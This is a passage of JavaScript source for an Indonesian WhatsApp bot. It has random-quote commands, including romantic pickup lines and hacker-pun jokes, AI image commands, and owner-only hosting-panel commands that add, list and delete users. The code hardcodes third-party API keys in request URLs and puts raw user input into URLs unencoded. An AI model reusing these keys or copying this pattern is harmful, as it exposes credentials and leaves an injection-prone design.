    "Berawal dari kenalan, bercanda bareng, ejek-ejekan kemudian berubah menjadi suka, nyaman dan akhirnya saling sayang dan mencintai",
    "Tersenyumlah pada orang yang telah menyakitimu agar sia tau arti kesabaran yang luar biasa",
    "Aku akan ingat kenangan pahit itu dan aku akan jadikan pelajaran untuk masa depan yang manis",
    "Kalau memang tak sanggup menepati janjimu itu setidaknya kamu ingat dan usahakan jagan membiarkan janjimu itu sampai kau lupa",
    "Hanya bisa diam dan berfikir Kenapa orang yang setia dan baik ditinggalin yang nakal dikejar-kejar giliran ditinggalin bilangnya laki-laki itu semuanya sama",
    "Walaupun hanya sesaat saja kau membahagiakanku tapi rasa bahagia yang dia tidak cepat dilupakan",
    "Aku tak menyangka kamu pergi dan melupakan ku begitu cepat",
    "Jomblo gak usah diam rumah mumpung malam minggu ya keluar jalan lah kan jomblo bebas bisa dekat sama siapapun pacar orang mantan sahabat bahkan sendiri atau bareng setan pun bisa",
    "Kamu adalah teman yang selalu di sampingku dalam keadaan senang maupun susah Terimakasih kamu selalu ada di sampingku",
    "Aku tak tahu sebenarnya di dalam hatimu itu ada aku atau dia",
    "Tak mudah melupakanmu karena aku sangat mencintaimu meskipun engkau telah menyakiti aku berkali-kali",
    "Hidup ini hanya sebentar jadi lepaskan saja mereka yang menyakitimu Sayangi Mereka yang peduli padamu dan perjuangan mereka yang berarti bagimu",
    "Tolong jangan pergi meninggalkanku aku masih sangat mencintai dan menyayangimu",
    "Saya mencintaimu dan menyayangimu jadi tolong jangan engkau pergi dan meninggalkan ku sendiri",
    "Saya sudah cukup tahu bagaimana sifatmu itu kamu hanya dapat memberikan harapan palsu kepadaku",
    "Aku berusaha mendapatkan cinta darimu tetapi Kamunya nggak peka",
    "Aku bangkit dari jatuh ku setelah kau jatuhkan aku dan aku akan memulainya lagi dari awal Tanpamu",
    "Mungkin sekarang jodohku masih jauh dan belum bisa aku dapat tapi aku yakin jodoh itu Takkan kemana-mana dan akan ku dapatkan",
    "Datang aja dulu baru menghina orang lain kalau memang dirimu dan lebih baik dari yang kau hina",
    "Membelakanginya mungkin lebih baik daripada melihatnya selingkuh didepan mata sendiri",
    "Bisakah hatimu seperti angsa yang hanya setia pada satu orang saja",
    "Aku berdiri disini sendiri menunggu kehadiran dirimu",
    "Aku hanya tersenyum padamu setelah kau menyakitiku agar kamu tahu arti kesabaran",
    "Maaf aku lupa ternyata aku bukan siapa-siapa",
    "Untuk memegang janjimu itu harus ada buktinya jangan sampai hanya janji palsu",
    "Aku tidak bisa selamanya menunggu dan kini aku menjadi ragu Apakah kamu masih mencintaiku",
    "Jangan buat aku terlalu berharap jika kamu tidak menginginkanku",
    "Lebih baik sendiri daripada berdua tapi tanpa kepastian",
    "Pergi bukan berarti berhenti mencintai tapi kecewa dan lelah karena harus berjuang sendiri",
    "Bukannya aku tidak ingin menjadi pacarmu Aku hanya ingin dipersatukan dengan cara yang benar",
    "Akan ada saatnya kok aku akan benar-benar lupa dan tidak memikirkan mu lagi",
    "Kenapa harus jatuh cinta kepada orang yang tak bisa dimiliki",
    "Jujur aku juga memiliki perasaan terhadapmu dan tidak bisa menolakmu tapi aku juga takut untuk mencintaimu",
    "Maafkan aku sayang tidak bisa menjadi seperti yang kamu mau",
    "Jangan memberi perhatian lebih seperti itu cukup biasa saja tanpa perlu menimbulkan rasa",
    "Aku bukan mencari yang sempurna tapi yang terbaik untukku",
    "Sendiri itu tenang tidak ada pertengkaran kebohongan dan banyak aturan",
    "Cewek strong itu adalah yang sabar dan tetap tersenyum meskipun dalam keadaan terluka",
    "Terima kasih karena kamu aku menjadi lupa tentang masa laluku",
    "Cerita cinta indah tanpa masalah itu hanya di dunia dongeng saja",
    "Kamu tidak akan menemukan apa-apa di masa lalu Yang ada hanyalah penyesalan dan sakit hati",
    "Mikirin orang yang gak pernah mikirin kita itu emang bikin gila",
    "Dari sekian lama menunggu apa yang sudah didapat",
    "Perasaan Bodo gue adalah bisa jatuh cinta sama orang yang sama meski udah disakiti berkali-kali",
    "Yang sendiri adalah yang bersabar menunggu pasangan sejatinya",
    "Aku terlahir sederhana dan ditinggal sudah biasa",
    "Aku sayang kamu tapi aku masih takut untuk mencintaimu",
    "Bisa berbagi suka dan duka bersamamu itu sudah membuatku bahagia",
    "Aku tidak pernah berpikir kamu akan menjadi yang sementara",
    "Jodoh itu bukan seberapa dekat kamu dengannya tapi seberapa yakin kamu dengan Allah",
    "Jangan paksa aku menjadi cewek seperti seleramu",
    "Hanya yang sabar yang mampu melewati semua kekecewaan",
    "Balikan sama kamu itu sama saja bunuh diri dan melukai perasaan ku sendiri",
    "Tak perlu membalas dengan menyakiti biar Karma yang akan urus semua itu",
    "Aku masih ingat kamu tapi perasaanku sudah tidak sakit seperti dulu",
    "Punya kalimat sendiri & mau ditambahin? chat *.owner*"
]
    let bacotan = pickRandom(galau)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesgombal': {
    function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const gombal = [
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "Seandainya sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "Aku gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "Kamu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "Kalausaja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "denganambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta.",
    "Kalo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku harap kamu tidak menanyakan hal terindah yang pernah singgah di kehidupanku, karena jawaban nya adalah kamu.",
    "Hal yang paling aku suka yaitu ngemil, namun tau gak ngemil apa yang paling aku suka? ngemilikin kamu sepenuhnya.",
    "seandainyaa sekarang adalah tanggal 28 oktober 1928, aku akan ubah naskah sumpah pemuda menjadi sumpah aku cinta kamu.",
    "kuu gak pernah merasakan ketakutan sedikit pun ketika berada didekat kamu, karena kamulah kekuatanku.",
    "kamuu tahu apa persamaan rasa sayangku ke kamu dengan matahari? Persamaannya adalah sama-sama terbit setiap hari dan hanya akan berakhir sampai kiamat.",
    "Kalau bus kota jauh dekat ongkosnya sama, tapi cinta ini dekat-dekat makin saling cinta.",
    "jikaa saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekedar membuat kamu tertawa. Aku rela.",
    "Anjing menggonggong kafilah berlalu, tiap hari bengong mikirin kamu melulu.",
    "Kalau aku jadi wakil rakyat kayaknya bakalan gagal deh. Gimana aku mau mikiran rakyat kalau yang ada dipikiran aku itu cuman ada kamu.",
    "atuu tambah satu sama dengan dua. Aku sama kamu sama dengan saling cinta,.",
    "aloo kita beda kartu GSM, itu gak masalah asalkan nantinya nama kita berdua ada di kartu Keluarga yang sama.",
    "Masalah yang selalu sulit untukku membuat mu mencintai ku, tapi lebih sulit memaksa hatiku untuk berhenti memikirkan dirimu.",
    "Aku tak pernah berjanji untuk sebuah perasaan, namun aku berusaha berjanji untuk sebuah kesetiaan.",
    "Aku sangat berharap kamu tau, kalau aku tidak pernah menyesali cintaku untuk mu, karena bagiku memiliki kamu sudah cukup bagi ku.",
    "Jangankan memilikimu, mendengar kamu kentut aja aku sudah bahagia.",
    "Aku mohon jangan jalan-jalan terus di pikiranku, duduk yang manis di hatiku saja.",
    "Berulang tahun memang indah, namun bagiku yang lebih indah jika berulang kali bersamamu.",
    "Napas aku kok sesek banget ya?, karena separuh nafasku ada di kamu.",
    "Jika ada seseorang lebih memilih pergi meninggalkan kamu, jangan pernah memohon padanya untuk tetap bertahan. Karena jika dia cinta, dia tak akan mau pergi.",
    "jangann diam aja dong, memang diam itu emas, tapi ketahuilah suara kamu itu seperti berlian.",
    "Kesasar itu serasa rugi banget, namun aku nggak merasa rugi karena cintaku sudah Biasanya orang yang lagi nyasar itu rugi ya, tapi tau gak? Aku gak merasa rugi sebab cintaku sudah nyasar ke hati bidadari.",
    "Ada 3 hal yang paling aku sukai di dunia ini, yaitu Matahari, Bulan dan Kamu. Matahari untuk siang hari, Bulan untuk malam hari dan Kamu untuk selamanya dihatiku.",
    "Sayang, kamu itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya.",
    "kuu gak perlu wanita yang sholeha, tapi bagaimana menuntun wanita yang aku cintai menjadi seorang yang sholehah.",
    "Aku tidak minta bintang atau bulan kepadamu. Cukup temani aku selamanya di bawah cahayanya.",
    "Akuana kalo kita berdua jadi komplotan penjahat: Aku mencuri hatimu, dan kamu mencuri hatiku?",
    "Aku gak perlu wanita yang cantik, tapi bagaimana aku menyanjung wanita yang aku cintai seperti wanita yang paling cantik di bumi ini.",
    "Aku pengen bersamamu cuma pada dua waktu: SEKARANG dan SELAMANYA.",
    "Akuu tuh bikin aku ga bisa tidur tau ga?",
    "Soalnya kamu selalu ada dibayang-bayang aku terus.",
    "Jika aku bisa jadi bagian dari dirimu,aku mau jadi air matamu,yang tersimpan di hatimu, lahir dari matamu, hidup di pipimu, dan mati di bibirmu.",
    "Papa kamu pasti kerja di apotik ya? | kenapa bang? | karena cuma kamu obat sakit hatiku.",
    "akuu selalu berusaha tak menangis karenamu, karena setiap butir yang jatuh, hanya makin mengingatkan, betapa aku tak bisa melepaskanmu.",
    "mauu nanya jalan nih. Jalan ke hatimu lewat mana ya?",
    "Andai sebuah bintang akan jatuh setiap kali aku mengingatmu, bulan pasti protes. Soalnya dia bakal sendirian di angkasa.",
    "Andai kamu gawang aku bolanya. Aku rela ditendang orang-orang demi aku dapat bersamamu,",
    "Dingin malam ini menusuk tulang. Kesendirian adalah kesepian. Maukah kau jadi selimut penghangat diriku?",
    "Keindahan Borobudur keajaiban dunia, keindahan kamu keajaiban cinta.",
    "Aku ingin mengaku dosa. Jangan pernah marah ya. Maafkan sebelumnya. Tadi malam aku mimpiin kamu jadi pacarku. Setelah bangun, akankah mimpiku jadi nyata?",
    "Kalau nggak sih aku bilang aku cinta kamu hari ini? Kalau besok gimana? Besok lusa? Besoknya besok lusa? Gimana kalau selamanya?",
    "Orangtuamu pengrajin bantal yah? Karena terasa nyaman jika di dekatmu.",
    "Jika malam adalah jeruji gelap yang menjadi sangkar, saya ingin terjebak selamanya di sana bersamamu.",
    "Sekarang aku gendutan gak sih? Kamu tau gak kenapa ? Soalnya kamu sudah mengembangkan cinta yang banyak di hatiku.",
    "Di atas langit masih ada langit. Di bawah langit masih ada aku yang mencintai kamu.",
    "Tau tidak kenapa malam ini tidak ada bintang? Soalnya bintangnya pindah semua ke matamu?",
    "Aku mencintaimu! Jika kamu benci aku, panah saja diriku. Tapi jangan di hatiku ya, karena di situ kamu berada.",
    "Bapak kamu pasti seorang astronot? | kok tau? | Soalnya aku melihat banyak bintang di matamu.",
    "Bapak kamu dosen ya? | kok tau? | karena nilai kamu A+ di hatiku.",
    "Kamu pasti kuliah di seni pahat ya? | kok tau sih? | Soalnya kamu pintar sekali memahat namamu di hatiku.",
    "Ya Tuhan, jika dia jodohku, menangkanlah tender pembangunan proyek menara cintaku di hatinya.",
    "Kamu mantan pencuri ya? | kok tau? | Abisnya kamu mencuri hatiku sih!",
    "Cowok : Aku suka senyum-senyum sendiri lho. | Cewek : Hah .. Gila Ya | Cowok : Nggak. Aku sedang mikirin kamu.",
    "Setiap malam aku berjalan-jalan di suatu tempat. Kamu tau di mana itu ? | gatau, emang dimana? | Di hatimu.",
    "Kamu pake Telkomesl ya? Karena sinyal-sinyal cintamu sangat kuat sampai ke hatiku.",
    "Kamu tahu gak sih? AKu tuh capek banget. Capek nahan kangen terus sama kamu.",
    "katanyaa kalau sering hujan itu bisa membuat seseorang terhanyut, kalau aku sekarang sedang terhanyut di dalam cintamu.",
    "Aku harap kamu jangan pergi lagi ya? karena, bila aku berpisah dengamu sedetik saja bagaikan 1000 tahun rasanya.",
    "Aku sih gak butuh week end, yang aku butuhkan hanyalah love you till the end.",
    "Emak kamu tukang Gado gado ya?, kok tau sih?, Pantesan saja kamu telah mencampur adukan perasaanku",
    "Walau hari ini cerah, tetapi tanpa kamu disisiku sama saja berselimutkan awan gelap di hati ini",
    "Kamu ngizinin aku kangen sehari berapa kali neng? Abang takut over dosis.",
    "cintaa aku ke kamu tuh bagaikan hutang, awalnya kecil, lama-lama didiemin malah tambah gede.",
    "Berulang tahun adalah hari yang indah. Tapih akin lebih indah kalo udah berulang-ulang kali bersama kamu."
]
let bacotan = pickRandom(gombal)
  reply(bacotan)

}
break
//=========================================\\======
case 'quoteshacker': {
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const heker = [
  "Dear kamu yang tertulis di halaman defacementku, Kapan jadi pacarku?",
  "Aku rela ko jadi Processor yg kepanasan, asalkan kmu yg jadi heatsink'y yg setiap saat bisa mendinginkan ku.",
  "Gak usah nyari celah xss deh, karena ketika kamu ngeklik hatiku udah muncul pop up namamu.",
  "berharap setelah aku berhasil login di hati kamu ga akan ada tombol logout, dan sessionku ga bakal pernah expired.",
  "Masa aku harus pake teknik symlink bypass buat buka-buka folder hatimu yg open_basedir enabled.",
  "Diriku dan Dirimu itu ibarat PHP dan MySQL yang belum terkoneksi.",
  "Jangan cuma bisa inject hatinya,tapi harus bisa patchnya juga. Biar tidak selingkuh sama hacker lain.",
  "Aku memang programmer PHP,tapi aku nggak akan php-in kamu kok.",
  "Eneeeng. | Apache? | Km wanita yg paling Unix yg pernah aku kenal |",
  "Sayang, capslock kamu nyala ya? | ngga, kenapa emangnya? | soalnya nama kamu ketulis gede bgt di hati aku | zzz! smile",
  "Aku deketin kamu cuma untuk redirect ke hati temenmu.",
  "Domain aja bisa parkir, masa cintaku ga bisa parkir dihatimu?",
  "Aku boleh jadi pacarmu? | 400(Bad Request) | Aku cium boleh? | 401(Authorization Required) | Aku buka bajumu yah | 402(Payment Required) sad",
  "kamu tau ga beda'y kamu sama sintax PHP, kalo sintax PHP itu susah di hafalin kalo kamu itu susah di lupain",
  "Kamu dulu sekolah SMK ambil kejuruan apa? | Teknik Komputer Jaringan | Terus sekarang bisa apa aja? | Menjaring hatimu lewat komputerku | biggrin",
  "Jika cinta itu Array, maka,cintaku padamu tak pernah empty jika di unset().",
  "SQLI ( Structured Query Love Injection )",
  "aku ingin kamu rm -rf kan semua mantan di otak mu,akulah root hati kamu",
  "Senyumu bagaikan cooler yang menyejukan hatiku ketika sedang overclock.",
  "kamu adalah terminalku, dimana aku menghabiskan waktuku untuk mengetikan beribu baris kode cinta untukmu smile",
  "Aku seneng nongkrong di zone-h, karena disanalah aku arsipkan beberapa website yang ada foto kamunya.",
  "hatiku ibarat vps hanya untukmu saja bukan shared hosting yg bisa tumpuk berbagai domain cinta.",
  "Aku bukanlah VNC Server Tanpa Authentication yg bisa kamu pantau kapan saja.",
  "Jangan men-dualboot-kan hatiku kepadamu.",
  "cintaku kan ku Ctrl+A lalu kan ku Ctrl+C dan kan ku Ctrl+V tepat di folder system hatimu.",
  "KDE kalah Cantiknya, GNOME kalah Simplenya, FluxBox kalah Ringannya, pokonya Semua DE itu Kalah Sama Kamu.",
  "Cintamu bagaikan TeamViewer yang selalu mengendalikan hatiku",
  "cinta kita tak akan bisa dipisahkan walau setebal apapun itu firewall...!!"
]

let bacotan = pickRandom(heker)
  reply(bacotan)
}
break
//=========================================\\======
case 'quotesbijak':{
  function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}
const quotes = [
"Keyakinan merupakan suatu pengetahuan di dalam hati, jauh tak terjangkau oleh bukti.",
"Rasa bahagia dan tak bahagia bukan berasal dari apa yang kamu miliki, bukan pula berasal dari siapa diri kamu, atau apa yang kamu kerjakan. Bahagia dan tak bahagia berasal dari pikiran kamu.",
"Sakit dalam perjuangan itu hanya sementara. Bisa jadi kamu rasakan dalam semenit, sejam, sehari, atau setahun. Namun jika menyerah, rasa sakit itu akan terasa selamanya.",
"Hanya seseorang yang takut yang bisa bertindak berani. Tanpa rasa takut itu tidak ada apapun yang bisa disebut berani.",
"Jadilah diri kamu sendiri. Siapa lagi yang bisa melakukannya lebih baik ketimbang diri kamu sendiri?",
"Kesempatan kamu untuk sukses di setiap kondisi selalu dapat diukur oleh seberapa besar kepercayaan kamu pada diri sendiri.",
"Kebanggaan kita yang terbesar adalah bukan tidak pernah gagal, tetapi bangkit kembali setiap kali kita jatuh.",
"Suatu pekerjaan yang paling tak kunjung bisa diselesaikan adalah pekerjaan yang tak kunjung pernah dimulai.",
"Pikiran kamu bagaikan api yang perlu dinyalakan, bukan bejana yang menanti untuk diisi.",
"Kejujuran adalah batu penjuru dari segala kesuksesan. Pengakuan adalah motivasi terkuat. Bahkan kritik dapat membangun rasa percaya diri saat disisipkan di antara pujian.",
"Segala sesuatu memiliki kesudahan, yang sudah berakhir biarlah berlalu dan yakinlah semua akan baik-baik saja.",
"Setiap detik sangatlah berharga karena waktu mengetahui banyak hal, termasuk rahasia hati.",
"Jika kamu tak menemukan buku yang kamu cari di rak, maka tulislah sendiri.",
"Jika hatimu banyak merasakan sakit, maka belajarlah dari rasa sakit itu untuk tidak memberikan rasa sakit pada orang lain.",
"Hidup tak selamanya tentang pacar.",
"Rumah bukan hanya sebuah tempat, tetapi itu adalah perasaan.",
"Pilih mana: Orang yang memimpikan kesuksesan atau orang yang membuatnya menjadi kenyataan?",
"Kamu mungkin tidak bisa menyiram bunga yang sudah layu dan berharap ia akan mekar kembali, tapi kamu bisa menanam bunga yang baru dengan harapan yang lebih baik dari sebelumnya.",
"Bukan bahagia yang menjadikan kita bersyukur, tetapi dengan bersyukurlah yang akan menjadikan hidup kita bahagia.",
"Aku memang diam. Tapi aku tidak buta.",
]
let bacotan = pickRandom(quotes)
  reply(bacotan)
}
break
//=========================================\\======
//=========================================\\======
case 'bingimg':
case 'bingimage': {
  if (!text) return replygcxeon(`Example : ${command} siapakah elon musk`)
  reply(mess.wait)
let data = await fetchJson(`https://kiicodeofficial.my.id/api/ai/disney?q=${encodeURIComponent(text)}&apikey=Dzsyacans`);
if (data.data && data.data.murl) {
  const bingimg = data.data.murl;
XeonBotInc.sendMessage(m.chat, { caption: `*Hasil Dari promt:*\n${text}`, image: { url: bingimg } }, { quoted: m });
}
}
break
//==================================================================

case 'youai': {
  if (!q) return replygcxeon(`Example : ${command} siapakah elon musk`)
  reply(mess.wait)
let response = await fetch(`https://kiicodeofficial.my.id/api/ai/youai?query=${q}&apikey=Dzsyacans`);
const data = await response.json();
reply(`${data.data.completion}`)
}
break
//==================================================================
case 'ttp':
      if(!text) return replygcxeon('teksnyaaa?')
      let ttp = await getBuffer(`https://vihangayt.me/maker/text2img?q=${text}`)
      XeonBotInc.sendImageAsSticker(from, ttp, m, { packname: global.packname, author: global.author })
      break
case 'attp':
      if(!text) return replygcxeon('teksnyaaa?')
      let attp = await getBuffer(`https://vihangayt.me/maker/text2gif?q=${text}`)
      XeonBotInc.sendImageAsSticker(from, attp, m, { packname: global.packname, author: global.author })
      break
//==================================================================
case 'tiktoksearch':
case 'carivideotiktok':
case 'ttsearch': {
  if (!q) return replygcxeon('_Mau cari apa kak_');
  reply(mess.wait);
    const response = await fetch(`https://skizo.tech/api/ttsearch?search=${q}&apikey=dzsyabotz`);
    const data = await response.json();
      XeonBotInc.sendMessage(m.chat, { video: { url: data.play }, caption: data.title }, { quoted: m });
}
break;
//==================================================================
case 'viral':{
  if (!XeonTheCreator) return XeonStickOwner()
  reply(mess.wait)
var asupan = JSON.parse(fs.readFileSync('./database/anuu.json'))
var hasil = pickRandom(asupan)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
}
break
//==================================================================
case 'midjourney':
case 'mdjourney': {
  if (!q) return reply('mana promt nya Kak')
reply(mess.wait)
const fotoCP = `*Hasil Dari Promt* :\n${text}`
XeonBotInc.sendMessage(m.chat, { caption: fotoCP, image: { url: `https://kiicodeofficial.my.id/api/ai/midjourney?text=${q}&apikey=Dzsyacans` } }, { quoted: m });
}
break;
//==================================================================
case 'dalle': {
  if (!q) return replygcxeon('Mana Textnya kak');
  reply(mess.wait);
  const fotoCP = `ini dia hasilnya dari ${q}`;
      XeonBotInc.sendMessage(m.chat, { caption: fotoCP, image: { url: `https://kiicodeofficial.my.id/api/ai/dalle?text=${q}s&apikey=Dzsyacans` } }, { quoted: m });
}
break;
//==================================================================
case 'text2image':
case 'text2img': {
if (!q) return reply('mana promt nya Kak')
reply(mess.wait)
const fotoCP = `*Hasil Dari Promt* :\n${text}`
XeonBotInc.sendMessage(m.chat, { caption: fotoCP, image: { url: `https://kiicodeofficial.my.id/api/ai/text2img?text=${q}&apikey=Dzsyacans`} }, { quoted: m });
}
break
//=============================================================
case 'anything': {
  if (!q) return reply('mana promt nya Kak')
reply(mess.wait)
const fotoCP = `*Hasil Dari Promt* :\n${text}`
XeonBotInc.sendMessage(m.chat, { caption: fotoCP, image: { url: `https://kiicodeofficial.my.id/api/ai/anything?text=${q}&apikey=Dzsyacans` } }, { quoted: m });
}
break
//=============================================================
case 'absolutely': {
  if (!q) return reply('mana promt nya Kak')
reply(mess.wait)
const fotoCP = `*Hasil Dari Promt* :\n${text}`
XeonBotInc.sendMessage(m.chat, { caption: fotoCP, image: { url: `https://kiicodeofficial.my.id/api/ai/absolutely?text=${q}&apikey=Dzsyacans` } }, { quoted: m });
}
break
//==================================================================
case "panel": {
const owned = `6285892928715@s.whatsapp.net`
const text12 = xeonytimewisher + ` *@${sender.split("@")[0]}*

 
BY Danzz Ofc

CARA ADD USER PANEL :
ram user,nomer

contoh : 1gb Danzz,6285892928715

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
XeonBotInc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break

case "listusr": {
  if (!XeonTheCreator) return XeonStickOwner()
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await XeonBotInc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
      if (!XeonTheCreator) return reply(`Khusus Danzz Ofc Aja`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
  if (!XeonTheCreator) return reply(`Khusus Danzz Ofc Aja`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                case "addusr": {

if (!XeonTheCreator) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await XeonBotInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await XeonBotInc.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
XeonBotInc.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break

case "listsrv": {
  if (!XeonTheCreator) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await XeonBotInc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;

case "tutorial": {
const owned = `6285892928715@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = xeonytimewisher + ` *@${sender.split("@")[0]}*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/rqqxkI4P8YY )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
XeonBotInc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break

case "ramlist": { 
const owned = `6285892928715@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = xeonytimewisher + ` *@${sender.split("@")[0]}*

▭▬▭▬▭( *SERVER V1* )▭▬▭▬▭

.1gb [username,nomor]
.2gb [username,nomor]
.3gb [username,nomor]
.4gb [username,nomor]
.5gb [username,nomor]
.6gb [username,nomor]
.7gb [username,nomor]
.8gb [username,nomor]
.unli [username,nomor]

Contoh:
.ram username,nomor
.1gb Danzz,6285892928715
▬▭▬▭▬▭▬▭▬▭▬▭▬

▭▬▭▬▭( *SERVER V2* )▭▬▭▬▭

.srv21gb [username,nomor]
.srv22gb [username,nomor]
.srv23gb [username,nomor]
.srv24gb [username,nomor]
.srv25gb [username,nomor]
.srv26gb [username,nomor]
.srv27gb [username,nomor]
.srv2unli [username,nomor]

Contoh:
.srv2(RAM PANEL) username,nomor
.srv21gb Danzz,6285892928715
▬▭▬▭▬▭▬▭▬▭▬▭▬`
XeonBotInc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/ramlist.mp3')
XeonBotInc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case 'premlist':{
if (!XeonTheCreator) return reply(mess.owner)
let listprem =`*LIST SELER Danzz Ofc*\n\nTotal Seller : ${owner.length}\n`
var no = 1
for (let x of owner) {
